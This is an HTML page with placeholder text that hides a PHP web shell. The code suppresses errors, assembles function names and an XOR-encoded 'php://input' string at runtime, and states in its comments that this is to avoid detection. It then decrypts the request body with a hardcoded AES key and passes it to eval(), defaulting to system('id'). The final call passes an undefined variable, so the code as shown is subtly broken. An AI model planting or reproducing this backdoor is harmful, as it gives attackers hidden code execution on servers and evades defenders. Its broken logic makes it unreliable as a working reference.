<html>
<head>
oh
</head>

<body>
nice




<?php
//error log suppressed to avoid detection
@error_reporting(0);
session_start();

//encryption key
$key="secret";
$_SESSION['k']=$key;

//file_get_content dynamically created to avoid detection
$f='file'.'_get'.'_contents';

//encoding string "php://input
$p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);

//file_get_content(php://input)
$payload_c=$f($p);

$payload=openssl_decrypt($payload_c, "AES128", $key);

if ($payload == " "){
	$payload = "system('id');";
}

class GFvTKW88{
	public function __invoke($p) {
		echo " <br>before eval()";
		@eval($p);
		echo "<br> after eval()";
	}
}

@call_user_func(new GFvTKW88(),$params);
?>


</body>
</html>
